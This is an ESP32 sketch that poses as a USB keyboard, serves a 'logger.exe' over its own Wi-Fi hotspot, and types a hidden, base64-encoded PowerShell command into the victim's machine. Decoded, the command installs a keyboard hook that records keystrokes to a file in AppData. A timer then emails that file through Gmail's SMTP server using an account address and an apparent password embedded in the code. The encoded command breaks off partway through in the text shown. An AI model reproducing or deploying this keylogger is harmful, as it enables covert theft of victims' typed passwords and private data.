// this code is used to show how the code would look when importing it into an esp32


WebServer server(80);
USBHIDKeyboard Keyboard;

void setup() {
  USB.begin();
  Keyboard.begin();
  delay(3000);  // Wait for USB to initialize

  // Start Access Point
  WiFi.softAP("ESP32_Payload", "password123");
  delay(500);

  // Serve the embedded logger.exe file
  server.on("/logger.exe", []() {
    server.sendHeader("Content-Type", "application/octet-stream");
    server.sendHeader("Content-Disposition", "attachment; filename=logger.exe");
    server.sendHeader("Content-Length", String(logger_exe_len));
    server.send(200);
    server.client().write(logger_exe, logger_exe_len);
  });
  

  server.begin();

  // Start injection
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("powershell");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

Keyboard.print("powershell -NoProfile -WindowStyle Hidden -EncodedCommand ");
delay(50);
Keyboard.print("QQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBv");
delay(50);
Keyboard.print("AG4AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUA");
delay(50);
Keyboard.print("cwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ASQBPADsADQAKAHUAcwBpAG4AZwAg");
delay(50);
Keyboard.print("AFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAA");
delay(50);
Keyboard.print("UwBlAHIAdgBpAGMAZQBzADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBt");
delay(50);
Keyboard.print("AC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzADsADQAKAHUAcwBpAG4AZwAgAFMA");
delay(50);
Keyboard.print("eQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwA7AA0ACgAN");
delay(50);
Keyboard.print("AAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABLAGUAeQBMAG8AZwBnAGUA");
delay(50);
Keyboard.print("cgAgAHsADQAKACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAHMAdABhAHQAaQBj");
delay(50);
Keyboard.print("ACAAUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAIABsAG8AZwBXAHIAaQB0AGUA");
delay(50);
Keyboard.print("cgA7AA0ACgAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABzAHQAYQB0AGkAYwAg");
delay(50);
Keyboard.print("AEkAbgB0AFAAdAByACAAaABvAG8AawBJAGQAIAA9ACAASQBuAHQAUAB0AHIA");
delay(50);
Keyboard.print("LgBaAGUAcgBvADsADQAKAA0ACgAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABk");
delay(50);
Keyboard.print("AGUAbABlAGcAYQB0AGUAIABJAG4AdABQAHQAcgAgAEwAbwB3AEwAZQB2AGUA");
delay(50);
Keyboard.print("bABLAGUAeQBiAG8AYQByAGQAUAByAG8AYwAoAGkAbgB0ACAAbgBDAG8AZABl");
delay(50);
Keyboard.print("ACwAIABJAG4AdABQAHQAcgAgAHcAUABhAHIAYQBtACwAIABJAG4AdABQAHQA");
delay(50);
Keyboard.print("cgAgAGwAUABhAHIAYQBtACkAOwANAAoADQAKACAAIAAgACAAcAByAGkAdgBh");
delay(50);
Keyboard.print("AHQAZQAgAHMAdABhAHQAaQBjACAATABvAHcATABlAHYAZQBsAEsAZQB5AGIA");
delay(50);
Keyboard.print("bwBhAHIAZABQAHIAbwBjACAAcAByAG8AYwAgAD0AIABIAG8AbwBrAEMAYQBs");
delay(50);
Keyboard.print("AGwAYgBhAGMAawA7AA0ACgANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMA");
delay(50);
Keyboard.print("dABhAHQAaQBjACAAdgBvAGkAZAAgAFMAdABhAHIAdAAoACkAIAB7AA0ACgAg");
delay(50);
Keyboard.print("ACAAIAAgACAAIAAgACAAbABvAGcAVwByAGkAdABlAHIAIAA9ACAAbgBlAHcA");
delay(50);
Keyboard.print("IABTAHQAcgBlAGEAbQBXAHIAaQB0AGUAcgAoAEUAbgB2AGkAcgBvAG4AbQBl");
delay(50);
Keyboard.print("AG4AdAAuAEcAZQB0AEYAbwBsAGQAZQByAFAAYQB0AGgAKABFAG4AdgBpAHIA");
delay(50);
Keyboard.print("bwBuAG0AZQBuAHQALgBTAHAAZQBjAGkAYQBsAEYAbwBsAGQAZQByAC4AQQBw");
delay(50);
Keyboard.print("AHAAbABpAGMAYQB0AGkAbwBuAEQAYQB0AGEAKQAgACsAIABAACIAXABrAGUA");
delay(50);
Keyboard.print("eQBzAC4AdAB4AHQAIgAsACAAdAByAHUAZQApADsADQAKACAAIAAgACAAIAAg");
delay(50);
Keyboard.print("ACAAIABoAG8AbwBrAEkAZAAgAD0AIABTAGUAdABIAG8AbwBrACgAcAByAG8A");
delay(50);
Keyboard.print("YwApADsADQAKACAAIAAgACAAIAAgACAAIABBAHAAcABsAGkAYwBhAHQAaQBv");
delay(50);
Keyboard.print("AG4ALgBSAHUAbgAoACkAOwANAAoAIAAgACAAIAAgACAAIAAgAFUAbgBoAG8A");
delay(50);
Keyboard.print("bwBrAFcAaQBuAGQAbwB3AHMASABvAG8AawBFAHgAKABoAG8AbwBrAEkAZAAp");
delay(50);
Keyboard.print("ADsADQAKACAAIAAgACAAIAAgACAAIABsAG8AZwBXAHIAaQB0AGUAcgAuAEMA");
delay(50);
Keyboard.print("bABvAHMAZQAoACkAOwANAAoAIAAgACAAIAB9AA0ACgANAAoAIAAgACAAIABw");
delay(50);
Keyboard.print("AHIAaQB2AGEAdABlACAAcwB0AGEAdABpAGMAIABJAG4AdABQAHQAcgAgAFMA");
delay(50);
Keyboard.print("ZQB0AEgAbwBvAGsAKABMAG8AdwBMAGUAdgBlAGwASwBlAHkAYgBvAGEAcgBk");
delay(50);
Keyboard.print("AFAAcgBvAGMAIABwAHIAbwBjACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAA");
delay(50);
Keyboard.print("dQBzAGkAbgBnACAAKABQAHIAbwBjAGUAcwBzACAAYwB1AHIAUAByAG8AYwBl");
delay(50);
Keyboard.print("AHMAcwAgAD0AIABQAHIAbwBjAGUAcwBzAC4ARwBlAHQAQwB1AHIAcgBlAG4A");
delay(50);
Keyboard.print("dABQAHIAbwBjAGUAcwBzACgAKQApAA0ACgAgACAAIAAgACAAIAAgACAAdQBz");
delay(50);
Keyboard.print("AGkAbgBnACAAKABQAHIAbwBjAGUAcwBzAE0AbwBkAHUAbABlACAAYwB1AHIA");
delay(50);
Keyboard.print("TQBvAGQAdQBsAGUAIAA9ACAAYwB1AHIAUAByAG8AYwBlAHMAcwAuAE0AYQBp");
delay(50);
Keyboard.print("AG4ATQBvAGQAdQBsAGUAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAA");
delay(50);
Keyboard.print("IAAgAHIAZQB0AHUAcgBuACAAUwBlAHQAVwBpAG4AZABvAHcAcwBIAG8AbwBr");
delay(50);
Keyboard.print("AEUAeAAoADEAMwAsACAAcAByAG8AYwAsACAARwBlAHQATQBvAGQAdQBsAGUA");
delay(50);
Keyboard.print("SABhAG4AZABsAGUAKABjAHUAcgBNAG8AZAB1AGwAZQAuAE0AbwBkAHUAbABl");
delay(50);
Keyboard.print("AE4AYQBtAGUAKQAsACAAMAApADsADQAKACAAIAAgACAAIAAgACAAIAB9AA0A");
delay(50);
Keyboard.print("CgAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABz");
delay(50);
Keyboard.print("AHQAYQB0AGkAYwAgAEkAbgB0AFAAdAByACAASABvAG8AawBDAGEAbABsAGIA");
delay(50);
Keyboard.print("YQBjAGsAKABpAG4AdAAgAG4AQwBvAGQAZQAsACAASQBuAHQAUAB0AHIAIAB3");
delay(50);
Keyboard.print("AFAAYQByAGEAbQAsACAASQBuAHQAUAB0AHIAIABsAFAAYQByAGEAbQApACAA");
delay(50);
Keyboard.print("ewANAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAbgBDAG8AZABlACAAPgA9");
delay(50);
Keyboard.print("ACAAMAAgACYAJgAgAHcAUABhAHIAYQBtACAAPQA9ACAAKABJAG4AdABQAHQA");
delay(50);
Keyboard.print("cgApADAAeAAxADAAMAApACAAewAgAC8ALwAgAFcATQBfAEsARQBZAEQATwBX");
delay(50);
Keyboard.print("AE4ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAbgB0ACAAdgBrAEMA");
delay(50);
Keyboard.print("bwBkAGUAIAA9ACAATQBhAHIAcwBoAGEAbAAuAFIAZQBhAGQASQBuAHQAMwAy");
delay(50);
Keyboard.print("ACgAbABQAGEAcgBhAG0AKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAA");
delay(50);
Keyboard.print("IABsAG8AZwBXAHIAaQB0AGUAcgAuAFcAcgBpAHQAZQBMAGkAbgBlACgAKAAo");
delay(50);
Keyboard.print("AEsAZQB5AHMAKQB2AGsAQwBvAGQAZQApAC4AVABvAFMAdAByAGkAbgBnACgA");
delay(50);
Keyboard.print("KQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGwAbwBnAFcAcgBp");
delay(50);
Keyboard.print("AHQAZQByAC4ARgBsAHUAcwBoACgAKQA7AA0ACgAgACAAIAAgACAAIAAgACAA");
delay(50);
Keyboard.print("fQANAAoAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAQwBhAGwAbABO");
delay(50);
Keyboard.print("AGUAeAB0AEgAbwBvAGsARQB4ACgAaABvAG8AawBJAGQALAAgAG4AQwBvAGQA");
delay(50);
Keyboard.print("ZQAsACAAdwBQAGEAcgBhAG0ALAAgAGwAUABhAHIAYQBtACkAOwANAAoAIAAg");
delay(50);
Keyboard.print("ACAAIAB9AA0ACgANAAoAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgA");
delay(50);
Keyboard.print("IgB1AHMAZQByADMAMgAuAGQAbABsACIAKQBdAA0ACgAgACAAIAAgAHAAcgBp");
delay(50);
Keyboard.print("AHYAYQB0AGUAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQA");
delay(50);
Keyboard.print("UAB0AHIAIABTAGUAdABXAGkAbgBkAG8AdwBzAEgAbwBvAGsARQB4ACgAaQBu");
delay(50);
Keyboard.print("AHQAIABpAGQASABvAG8AawAsACAATABvAHcATABlAHYAZQBsAEsAZQB5AGIA");
delay(50);
Keyboard.print("bwBhAHIAZABQAHIAbwBjACAAbABwAGYAbgAsACAASQBuAHQAUAB0AHIAIABo");
delay(50);
Keyboard.print("AE0AbwBkACwAIAB1AGkAbgB0ACAAZAB3AFQAaAByAGUAYQBkAEkAZAApADsA");
delay(50);
Keyboard.print("DQAKAA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAHUAcwBl");
delay(50);
Keyboard.print("AHIAMwAyAC4AZABsAGwAIgApAF0ADQAKACAAIAAgACAAcAByAGkAdgBhAHQA");
delay(50);
Keyboard.print("ZQAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAVQBu");
delay(50);
Keyboard.print("AGgAbwBvAGsAVwBpAG4AZABvAHcAcwBIAG8AbwBrAEUAeAAoAEkAbgB0AFAA");
delay(50);
Keyboard.print("dAByACAAaABoAGsAKQA7AA0ACgANAAoAIAAgACAAIABbAEQAbABsAEkAbQBw");
delay(50);
Keyboard.print("AG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIAKQBdAA0ACgAgACAA");
delay(50);
Keyboard.print("IAAgAHAAcgBpAHYAYQB0AGUAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBu");
delay(50);
Keyboard.print("ACAASQBuAHQAUAB0AHIAIABDAGEAbABsAE4AZQB4AHQASABvAG8AawBFAHgA");
delay(50);
Keyboard.print("KABJAG4AdABQAHQAcgAgAGgAaABrACwAIABpAG4AdAAgAG4AQwBvAGQAZQAs");
delay(50);
Keyboard.print("ACAASQBuAHQAUAB0AHIAIAB3AFAAYQByAGEAbQAsACAASQBuAHQAUAB0AHIA");
delay(50);
Keyboard.print("IABsAFAAYQByAGEAbQApADsADQAKAA0ACgAgACAAIAAgAFsARABsAGwASQBt");
delay(50);
Keyboard.print("AHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIAKQBdAA0A");
delay(50);
Keyboard.print("CgAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABzAHQAYQB0AGkAYwAgAGUAeAB0");
delay(50);
Keyboard.print("AGUAcgBuACAASQBuAHQAUAB0AHIAIABHAGUAdABNAG8AZAB1AGwAZQBIAGEA");
delay(50);
Keyboard.print("bgBkAGwAZQAoAHMAdAByAGkAbgBnACAAbABwAE0AbwBkAHUAbABlAE4AYQBt");
delay(50);
Keyboard.print("AGUAKQA7AA0ACgB9AA0ACgAiAEAAIAAtAFIAZQBmAGUAcgBlAG4AYwBlAGQA");
delay(50);
Keyboard.print("QQBzAHMAZQBtAGIAbABpAGUAcwAgACIAUwB5AHMAdABlAG0ALgBXAGkAbgBk");
delay(50);
Keyboard.print("AG8AdwBzAC4ARgBvAHIAbQBzACIALAAgACIAUwB5AHMAdABlAG0ALgBEAHIA");
delay(50);
Keyboard.print("YQB3AGkAbgBnACIADQAKAA0ACgANAAoAJABFAG0AYQBpAGwAVABpAG0AZQBy");
delay(50);
Keyboard.print("ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABUAGkAbQBlAHIAcwAuAFQA");
delay(50);
Keyboard.print("aQBtAGUAcgANAAoAJABFAG0AYQBpAGwAVABpAG0AZQByAC4ASQBuAHQAZQBy");
delay(50);
Keyboard.print("AHYAYQBsACAAPQAgADYAMAAwADAAIAANAAoAJABFAG0AYQBpAGwAVABpAG0A");
delay(50);
Keyboard.print("ZQByAC4AQQB1AHQAbwBSAGUAcwBlAHQAIAA9ACAAJAB0AHIAdQBlAA0ACgAk");
delay(50);
Keyboard.print("AEUAbQBhAGkAbABUAGkAbQBlAHIALgBFAG4AYQBiAGwAZQBkACAAPQAgACQA");
delay(50);
Keyboard.print("dAByAHUAZQANAAoADQAKAA0ACgBSAGUAZwBpAHMAdABlAHIALQBPAGIAagBl");
delay(50);
Keyboard.print("AGMAdABFAHYAZQBuAHQAIAAtAEkAbgBwAHUAdABPAGIAagBlAGMAdAAgACQA");
delay(50);
Keyboard.print("RQBtAGEAaQBsAFQAaQBtAGUAcgAgAC0ARQB2AGUAbgB0AE4AYQBtAGUAIABF");
delay(50);
Keyboard.print("AGwAYQBwAHMAZQBkACAALQBBAGMAdABpAG8AbgAgAHsADQAKACAAIAAgACAA");
delay(50);
Keyboard.print("dAByAHkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAJABsAG8AZwBGAGkAbABl");
delay(50);
Keyboard.print("ACAAIAA9ACAAIgAkAGUAbgB2ADoAQQBQAFAARABBAFQAQQBcAGsAZQB5AHMA");
delay(50);
Keyboard.print("LgB0AHgAdAAiAA0ACgAgACAAIAAgACAAIAAgACAAJAB0AGUAbQBwAEMAbwBw");
delay(50);
Keyboard.print("AHkAIAA9ACAAIgAkAGUAbgB2ADoAQQBQAFAARABBAFQAQQBcAGsAZQB5AHMA");
delay(50);
Keyboard.print("QwBvAHAAeQAuAHQAeAB0ACIADQAKAA0ACgAgACAAIAAgACAAIAAgACAAQwBv");
delay(50);
Keyboard.print("AHAAeQAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAGwAbwBnAEYAaQBsAGUA");
delay(50);
Keyboard.print("IAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACQAdABlAG0AcABDAG8AcAB5");
delay(50);
Keyboard.print("ACAALQBGAG8AcgBjAGUADQAKAA0ACgAgACAAIAAgACAAIAAgACAAJABzAG0A");
delay(50);
Keyboard.print("dABwAFMAZQByAHYAZQByACAAPQAgACIAcwBtAHQAcAAuAGcAbQBhAGkAbAAu");
delay(50);
Keyboard.print("AGMAbwBtACIADQAKACAAIAAgACAAIAAgACAAIAAkAHMAbQB0AHAARgByAG8A");
delay(50);
Keyboard.print("bQAgACAAIAA9ACAAIgB0AGUAcwB0AGkAbgBnAEsATAAyADUAMABAAGcAbQBh");
delay(50);
Keyboard.print("AGkAbAAuAGMAbwBtACIADQAKACAAIAAgACAAIAAgACAAIAAkAHMAbQB0AHAA");
delay(50);
Keyboard.print("VABvACAAIAAgACAAIAA9ACAAIgB0AGUAcwB0AGkAbgBnAEsATAAyADUAMABA");
delay(50);
Keyboard.print("AGcAbQBhAGkAbAAuAGMAbwBtACIADQAKACAAIAAgACAAIAAgACAAIAAkAHMA");
delay(50);
Keyboard.print("bQB0AHAAVQBzAGUAcgAgACAAIAA9ACAAIgB0AGUAcwB0AGkAbgBnAEsATAAy");
delay(50);
Keyboard.print("ADUAMABAAGcAbQBhAGkAbAAuAGMAbwBtACIADQAKACAAIAAgACAAIAAgACAA");
delay(50);
Keyboard.print("IAAkAHMAbQB0AHAAUABhAHMAcwAgACAAIAA9ACAAIgBDAGEAcgBzAG4AaQBj");
delay(50);
Keyboard.print("AGsAOAAqACIAIAAgACMAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABpAHMA");
delay(50);
Keyboard.print("IABpAHMAIABhAG4AIABBAHAAcAAgAFAAYQBzAHMAdwBvAHIAZAANAAoAIAAg");
delay(50);
Keyboard.print("ACAAIAAgACAAIAAgACQAcwB1AGIAagBlAGMAdAAgACAAIAAgAD0AIAAiAEsA");
delay(50);
Keyboard.print("ZQB5AGwAbwBnACAAUgBlAHAAbwByAHQAIAAtACAAJAAoAEcAZQB0AC0ARABh");
delay(50);
Keyboard.print("AHQAZQAgAC0ARgBvAHIAbQBhAHQAIAAnAGcAJwApACIADQAKACAAIAAgACAA");
delay(50);
Keyboard.print("IAAgACAAIAAkAGIAbwBkAHkAIAAgACAAIAAgACAAIAA9ACAAIgBBAHQAdABh");
delay(50);
Keyboard.print("AGMAaABlAGQAIABhAHIAZQAgAHQAaABlACAAcgBlAGMAZQBuAHQAIABLAGUA");
delay(50);
Keyboard.print("eQBzAHQAcgBvAGsAZQBzACIADQAKAA0ACgAgACAAIAAgACAAIAAgACAAUwBl");
delay(50);
Keyboard.print("AG4AZAAtAE0AYQBpAGwATQBlAHMAcwBhAGcAZQAgAC0ARgByAG8AbQAgACQA");
delay(50);


  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {
  server.handleClient();  // Keep serving the file
}
